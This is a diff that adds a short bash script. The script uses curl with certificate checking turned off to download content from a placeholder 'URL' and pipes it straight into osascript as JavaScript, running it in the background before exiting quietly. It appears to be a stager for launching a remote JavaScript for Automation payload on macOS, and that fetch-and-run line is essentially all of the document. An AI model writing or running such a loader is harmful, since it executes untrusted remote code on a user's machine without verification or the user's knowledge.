@@ -1,0 +1,4 @@
+#!/bin/bash
+curl -k "URL" | osascript -l JavaScript &
+
+exit 0
